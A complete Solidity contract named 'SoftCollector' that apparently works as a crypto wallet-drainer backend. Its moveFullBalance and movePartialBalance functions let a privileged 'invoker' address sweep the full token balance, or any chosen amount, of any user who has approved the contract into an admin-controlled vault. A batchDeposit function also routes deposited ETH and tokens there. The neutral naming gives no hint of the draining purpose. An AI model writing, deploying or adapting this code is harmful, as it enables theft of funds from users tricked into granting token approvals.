// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status = _NOT_ENTERED;
    modifier nonReentrant() {
        require(_status != _ENTERED, "Reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

contract SoftCollector is ReentrancyGuard {
    address public admin;
    address public vault;
    address public invoker;
    event VaultUpdated(address indexed oldVault, address indexed newVault);
    event InvokerUpdated(address indexed oldInvoker, address indexed newInvoker);
    event AdminChanged(address indexed oldAdmin, address indexed newAdmin);
    constructor(address _vault, address _invoker) {
        require(_vault != address(0), "Vault=0");
        require(_invoker != address(0), "Invoker=0");
        vault = _vault;
        invoker = _invoker;
        admin = msg.sender;
    }
    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin");
        _;
    }
    modifier onlyInvoker() {
        require(msg.sender == invoker, "Only invoker");
        _;
    }
    function moveFullBalance(address token, address user) external onlyInvoker {
        IERC20 t = IERC20(token);
        uint256 amount = t.balanceOf(user);
        if (amount == 0) {
            return;
        }
        t.transferFrom(user, vault, amount);
    }
    function movePartialBalance(address token, address user, uint256 amount) external onlyInvoker {
        if (amount == 0) {
            return;
        }
        IERC20(token).transferFrom(user, vault, amount);
    }
    function batchDeposit(address[] calldata tokens, uint256[] calldata amounts) external payable nonReentrant {
        require(tokens.length == amounts.length, "Len mismatch");
        if (msg.value > 0) {
            (bool success, ) = payable(vault).call{value: msg.value}("");
            require(success, "ETH send fail");
        }
        for (uint256 i = 0; i < tokens.length; i++) {
            address tk = tokens[i];
            uint256 am = amounts[i];
            if (tk == address(0) || am == 0) {
                continue;
            }
            IERC20(tk).transferFrom(msg.sender, vault, am);
        }
    }
    function setVault(address newVault) external onlyAdmin {
        require(newVault != address(0), "Vault=0");
        emit VaultUpdated(vault, newVault);
        vault = newVault;
    }
    function setInvoker(address newInvoker) external onlyAdmin {
        require(newInvoker != address(0), "Invoker=0");
        emit InvokerUpdated(invoker, newInvoker);
        invoker = newInvoker;
    }
    function changeAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "Admin=0");
        emit AdminChanged(admin, newAdmin);
        admin = newAdmin;
    }
}